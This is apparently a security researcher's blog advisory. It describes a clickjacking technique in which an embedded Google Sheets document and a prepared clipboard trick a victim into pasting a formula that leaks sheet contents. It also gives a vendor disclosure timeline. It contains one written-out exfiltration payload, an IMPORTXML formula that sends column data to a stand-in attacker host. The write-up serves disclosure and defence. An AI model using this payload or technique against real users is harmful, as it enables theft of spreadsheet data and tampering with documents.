---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-03-25_clipboard-hazard-with-google-sheets.md
original_filename: 2022-03-25_clipboard-hazard-with-google-sheets.md
title: Clipboard hazard with Google Sheets
category: documents
detected_topics:
- command-injection
- clickjacking
- api-security
tags:
- imported
- documents
- command-injection
- clickjacking
- api-security
language: en
raw_sha256: ac755a8630d6286b5be786fb5179766f6a80133e29d905952b67d9314c49e82e
text_sha256: de2cc784fd0be534ea9d986119fb02cd307d7b637739e8d1acc2c4ca34cc444e
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# Clipboard hazard with Google Sheets

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-03-25_clipboard-hazard-with-google-sheets.md
- Source Type: markdown
- Detected Topics: command-injection, clickjacking, api-security
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `ac755a8630d6286b5be786fb5179766f6a80133e29d905952b67d9314c49e82e`
- Text SHA256: `de2cc784fd0be534ea9d986119fb02cd307d7b637739e8d1acc2c4ca34cc444e`


## Content

---
title: "Clipboard hazard with Google Sheets"
url: "https://irsl.medium.com/clipboard-hazard-with-google-sheets-1c1f3d566907"
authors: ["Imre Rad (@ImreRad)"]
programs: ["Google"]
bugs: ["Phishing"]
publication_date: "2022-03-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2784
scraped_via: "browseros"
---

# Clipboard hazard with Google Sheets

Clipboard hazard with Google Sheets
Imre Rad
Follow
2 min read
·
Mar 25, 2022

This is an advisory about an interesting attack vector against Google Sheets that abuses embedded Sheets documents to exfiltrate content. Google does not consider this a security risk (“working as intended”).

Embedding web applications via iframes is subject of clickjacking attacks, so it is usually blocked via HTTP response headers. Google Sheets does the same on the front pages (so you can’t embed https://docs.google.com/ or https://docs.google.com/spreadsheets), but it does allow embedding documents. This is a feature: the application is loaded in safe mode, disabling certain features (e.g. you can’t access the standard clipboard copy/paste features through mouse interaction). Clipboard can still be manipulated through the standard keyboard shortcuts (CTRL+C, CTRL+V).

The risk assigned to clickjacking attacks is usually determined based on how (un)likely the interaction is that the victim would need to make on the website. The attack I’m demonstrating needs only one interaction: pressing CTRL+V on the attacker controlled website. I believe this can be easily considered “likely”, at least I could come up with a website idea quickly where I would do that without any hesitation :) Also note, we are in the middle of a cyber war; phishing campaigns are part of our every days.

How does it work? The attacker page embeds the Google Sheet document in an invisible top layer iframe, changes data on the clipboard and convinces the victim to press CTRL+V.

If the data placed on the clipboard is a formula, Sheets evaluates it. Sheets also features a couple of formulas to import data from a remote location. Abusing this feature allows exfiltrating contents of the sheet. The attacker payload could look something like this:

=IMPORTXML(CONCAT("https://attacker.controller.path/";CONCATENATE($C:$C)); "/root")

By pressing CTRL+V, one may expect data to change (somewhere), but definitely not data to be leaked.

Get Imre Rad’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

An attacker could:

#1: modify range(s) of a document where he/she has only read-only access. Full control over the content.
#2: exfiltrate data from a document that the attacker has no access to (but knows the ID of the document).

Video PoC for attack vector #2:

When running in safe mode, Google could disable the IMPORT* functions, or introduce an explicit sheet level attribute to enable the document to be embedded.

The proof of concept web application can be found here.

Timeline

2022–03–23: Issue reported to VRP

2022–03–25: “Although it may come as a surprise, this is actually working as intended. The product team decided to allow some types of actions when a Google Doc is framed (for example, adding a doc to Drive). We’ve reviewed the actions that are allowed for framed Docs, and we’ve determined that the security risk of the available actions is low.”
